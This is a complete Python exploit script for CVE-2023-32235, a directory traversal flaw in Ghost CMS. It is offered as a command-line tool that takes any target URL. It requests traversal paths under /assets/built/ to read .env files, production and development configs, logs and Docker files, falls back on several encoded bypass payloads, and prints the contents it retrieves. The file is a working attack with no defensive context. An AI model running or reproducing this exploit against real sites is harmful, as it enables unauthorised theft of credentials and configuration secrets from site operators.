import requests
import sys

class ExploitResult:
    def __init__(self):
        self.success = False
        self.payload = ""
        self.response = ""
        self.status_code = 0
        self.description = "Ghost before 5.42.1 allows remote attackers to read arbitrary files within the active theme's folder via /assets/built/../..// directory traversal"
        self.severity = "High"

class PathTraversalExploit:
    def __init__(self, target_url: str, verbose: bool = True):
        self.target_url = target_url.rstrip('/')
        self.verbose = verbose
        self.session = requests.Session()
        self.session.headers.update({
            'Accept': '*/*',
            'Cache-Control': 'no-cache',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
    def exploit(self) -> ExploitResult:
        result = ExploitResult()
        payloads = [
            {"path": "../../package.json", "sensitive": True},
            {"path": "../../../package.json", "sensitive": True},
            {"path": "../../config.production.json", "sensitive": True},
            {"path": "../../config.development.json", "sensitive": True},
            {"path": "../../.env", "sensitive": True},
            {"path": "../../../.env", "sensitive": True},
            {"path": "../../content/settings/routes.yaml", "sensitive": False},
            {"path": "../../content/logs/ghost.log", "sensitive": False},
            {"path": "../../README.md", "sensitive": False},
            {"path": "../../yarn.lock", "sensitive": False},
            {"path": "../../package-lock.json", "sensitive": False},
            {"path": "../../../Dockerfile", "sensitive": False},
            {"path": "../../../docker-compose.yml", "sensitive": False}
        ]
        
        for payload in payloads:
            target_url = f"{self.target_url}/assets/built/{payload['path']}"
            try:
                response = self.session.get(target_url, timeout=10)
                if response.status_code == 200 and len(response.text) > 0:
                    if self._detect_file_read_success(response.text, payload['path']):
                        result.success = True
                        result.payload = payload['path']
                        result.response = response.text
                        result.status_code = response.status_code
                        if payload['sensitive']:
                            result.severity = "Critical"
                        return result
            except requests.RequestException:
                continue
                
        if not result.success:
            self._try_path_traversal_bypasses(result)
        return result
        
    def _try_path_traversal_bypasses(self, result: ExploitResult):
        bypass_payloads = [
            "..%2f..%2fpackage.json",
            "..%252f..%252fpackage.json",
            "....//....//package.json",
            "..\\\\..\\\\package.json",
            ".%2e/.%2e/package.json",
            "..%c0%af..%c0%afpackage.json",
        ]
        
        for payload in bypass_payloads:
            target_url = f"{self.target_url}/assets/built/{payload}"
            try:
                response = self.session.get(target_url, timeout=10)
                if response.status_code == 200 and self._detect_file_read_success(response.text, payload):
                    result.success = True
                    result.payload = payload
                    result.response = response.text
                    result.status_code = response.status_code
                    break
            except requests.RequestException:
                continue
                
    def _detect_file_read_success(self, body: str, payload: str) -> bool:
        file_indicators = {
            "package.json": ['"name"', '"version"', '"dependencies"', '"scripts"'],
            ".env": ["DATABASE_URL", "NODE_ENV", "GHOST_", "="],
            "config": ['"database"', '"server"', '"url"', '"mail"'],
            "routes.yaml": ["routes:", "collections:", "taxonomies:"],
            "ghost.log": ["INFO", "ERROR", "WARN", "Ghost"],
            "README": ["#", "##", "Ghost", "installation"],
            "Dockerfile": ["FROM", "RUN", "COPY", "EXPOSE"],
            "docker-compose": ["version:", "services:", "ghost:"]
        }
        
        for file_type, indicators in file_indicators.items():
            if file_type.lower() in payload.lower():
                for indicator in indicators:
                    if indicator in body:
                        return True
        generic_indicators = ["{", "}", "[", "]", ":", "=", "version", "name", "description"]
        count = sum(1 for indicator in generic_indicators if indicator in body)
        return count >= 3

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 CVE-2023-32235.py <target_url>")
        print("Example: python3 CVE-2023-32235.py http://target.com")
        return
    exploit = PathTraversalExploit(sys.argv[1], verbose=True)
    result = exploit.exploit()
    print("\n=== CVE-2023-32235 Path Traversal Exploit Results ===")
    print(f"Target: {exploit.target_url}")
    print(f"Success: {result.success}")
    print(f"Severity: {result.severity}")
    print(f"Description: {result.description}")
    if result.success:
        print(f"Payload: {result.payload}")
        print(f"Status Code: {result.status_code}")
        print(f"Response Preview: {result.response[:500]}")
    else:
        print("Exploit failed - target may not be vulnerable")

if __name__ == "__main__":
    main()
